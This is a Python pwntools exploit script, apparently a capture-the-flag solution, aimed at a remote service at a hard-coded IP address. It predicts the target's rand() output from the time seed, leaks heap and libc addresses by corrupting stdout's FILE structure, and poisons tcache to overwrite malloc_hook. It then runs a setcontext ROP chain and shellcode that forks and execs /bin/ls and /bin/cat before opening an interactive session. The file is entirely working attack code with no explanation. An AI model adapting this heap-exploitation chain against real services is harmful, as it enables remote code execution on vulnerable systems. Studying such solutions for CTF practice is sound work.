from pwn import *
from mixer import *
from IO_FILE import *
from ctypes import *
import time

context.arch = 'amd64'
libc = CDLL("libc.so.6")

def batchgen():
    global seenaddr
    addr = libc.rand()&0xfffffffffffff000
    if addr in seenaddr or addr+0x1000 in seenaddr:
        collision = True
    else:
        collision = False
    seenaddr.add(addr)
    seenaddr.add(addr+0x1000)
    randnums = [0 for i in range(0x400)]
    for i in range(0x400):
        randnums[i] = libc.rand()
    return collision, randnums

def guess(idx,target_hash,size,data=b''):
    global buffill
    if type(data)==str:
        data = data.encode()
    if target_hash!=-1:
        if size<len(data)+4:
            print('impossible')
            exit()
        data=recover(target_hash,size,data)
        buffill+=13
    else:
        data = data.ljust(size,b'\x00')
    if size<0x10:
        print('nope')
        exit()
    r.send(str(idx).rjust(7,' '))
    r.send(str(size).rjust(7,' '))
    r.send(data[:-1])
 

def exhaust(start,end):
    global buffill, fillcnt
    allres = []
    for i in range(start,end):
        print('>',i)
        guess(i,currand[i],0x20,'M30W')
        if buffill>0x1000:
            fillcnt+=1
            cnt = 0
            res = b''
            while cnt!=0x1000:
                res+=r.recv(0x1000-cnt)
                cnt=len(res)
            buffill-=0x1000
            allres.append(res)
    return allres

###Addr
stdout_struct_offset = 0x1ec6a0
stdout_readptr_offset = stdout_struct_offset+8
mmap_page_offset = 0x216000
main_arena_offset = 0x1ebb80
unsorted_bin_offset = main_arena_offset+0x60
malloc_hook_offset = 0x1ebb70
IO_str_jumps_offset = 0x1ed560

###ROPgadget
L_nop = 0x3491f
L_pop_rdi = 0x26b72
L_pop_rsi = 0x27529
L_pop_rdx_rbx = 0x162866
L_pop_rax = 0x4a550
L_inc_rax = 0xd2c70
L_syscall = 0x66229
L_trampoline = 0x154930
L_setcontext = 0x580dd

###Exploit
T = libc.time(0)+5
while True:
    print(T)
    libc.srand(T)
    seenaddr = set()

    Arand = []
    tokill = -1
    for i in range(30):  #manageable within timeout
        collision, rands = batchgen()
        Arand.append(rands)
        if collision:
            tokill = i
            break
    if tokill!=-1:
        break
    T+=1

print(f'now time : {libc.time(0)}')
print(f'target time : {T}')
print(f'rounds : {tokill}')
while True:
    if libc.time(0)==T:
        r = remote('111.186.59.32',60001)
        break

print('start!')
print(tokill)

fillcnt = 0
buffill = 0

currand = Arand[0]
guess(0,currand[0],0x20,'M30W')
guess(1,currand[1],0x3f0,'M30W')

if tokill!=0:
    exhaust(2,0x400)

for i in range(1,tokill):
    print(i)
    currand = Arand[i]
    exhaust(0,0x400)

currand = Arand[-1]

start = 0
while buffill<0x10 or buffill>0xf00:
    guess(start,currand[start],0x20,'M30W')
    start+=1
val = u32(b'unbelievable\nunbelievable\n'[(fillcnt*0x1000)%13:][:4])
guess((stdout_readptr_offset-mmap_page_offset)//8,val,0x20,'M30W')

if buffill<0x600:
    print('!!!')
    required = (0x600-buffill)//13+1+start
    exhaust(start,required)
    start = required


guess(start,currand[start],0x250,'M30W')
start+=1
required = (0x1000-buffill)//13+1+start
leaks = exhaust(start,required)[0]
heap_addr = u64(leaks[0x8:0x10])-0x10
print(hex(heap_addr))
unsorted_bin_addr = u64(leaks[0x260:0x268])
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))


start = required
guess(start,currand[start],0x300,'M30W')
guess(start+1,currand[start+1],0x360,'M30W')
guess(start+2,currand[start+2],0x380,'M30W')
guess(start+3,currand[start+3],0x390,'M30W')
start+=4

val = u32(b'unbelievable\nunbelievable\n'[(fillcnt*0x1000)%13:][:4])
guess((stdout_readptr_offset-mmap_page_offset)//8,val,0x20,'M30W')
required = (0x1300-buffill)//13+1+start
exhaust(start,required)
start = required
val = u32(b'unbelievable\nunbelievable\n'[(fillcnt*0x1000)%13:][:4])
guess((stdout_readptr_offset-mmap_page_offset)//8,val,0x20,'M30W')


guess(start,-1,0x250,p64(heap_addr+0x10))   #fail1

fakeframe = p64(0)*3+p64(libc_base+L_setcontext)+\
            p64(0)*16+\
            p64(heap_addr+0xc8d0+0xb0)+p64(libc_base+L_nop)
ROPchain = p64(libc_base+L_pop_rdi)+p64(heap_addr+0xc000)+\
           p64(libc_base+L_pop_rsi)+p64(0x1000)+\
           p64(libc_base+L_pop_rdx_rbx)+p64(7)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(9)+\
           p64(libc_base+L_inc_rax)+\
           p64(libc_base+L_syscall)+\
           p64(heap_addr+0xc8d0+0xb0+0x60)
shellcode = asm(f'''
                 mov rax, 57
                 syscall
                 cmp rax, 0
                 jne PARENT

                 CHILD:
                     mov rsi, {heap_addr+0xc8d0+0xb0+0x60+0x70}
                     mov rdx, {heap_addr+0xc8d0+0xb0+0x60+0x88}
                     jmp EXECVEAT

                 PARENT:
                     mov rdi, 0
                     mov rsi, {heap_addr}
                     mov rdx, 0x100
                     mov rax, 0
                     syscall

                     mov rsi, {heap_addr+0xc8d0+0xb0+0x60+0x78}
                     mov rdx, {heap_addr+0xc8d0+0xb0+0x60+0x98}

                 EXECVEAT:
                     xor rdi, rdi
                     xor r10, r10
                     xor r8, r8
                     mov rax, 322
                     syscall
                 ''')
arguments = b'/bin/ls\x00'+\
            b'/bin/cat\x00\x00\x00\x00\x00\x00\x00\x00'+\
            p64(heap_addr+0xc8d0+0xb0+0x60+0x70)+p64(0)+\
            p64(heap_addr+0xc8d0+0xb0+0x60+0x78)+p64(heap_addr)+p64(0)
payload = fakeframe+ROPchain+shellcode.ljust(0x70,b'\x00')+arguments
guess(start,-1,0x250,payload)     #fail2

guess(start,currand[start],0x250,(p16(0)*0x10+p16(1)+p16(1)).ljust(0x80,b'\x00')+p64(0)*0x10+p64(libc_base+stdout_struct_offset)+p64(libc_base+malloc_hook_offset))  #succeed

IO_file = IO_FILE_plus(arch=64)
stream = IO_file.construct(flags=0xfbad2082,
                           write_ptr=heap_addr+0xc8d0,
                           lock=heap_addr,
                           vtable = libc_base+IO_str_jumps_offset-0x20)

payload = stream+p64(0)+p64(libc_base+stdout_struct_offset)
guess(start+1,-1,0x110,payload)     #fail3

payload = p64(libc_base+L_setcontext)

guess(start+1,-1,0x120,payload)     #fail4+trigger

while True:
    res = r.recvline()
    if b'flag' in res:
        break
    continue
    res = input('continue : ')
    if res=='n':
        break
r.send(res.strip()+b'\x00')
r.interactive()


###NOTE  tcache ptr somewhere at page before libc
###NOTE: seems like stdout is only possible leak
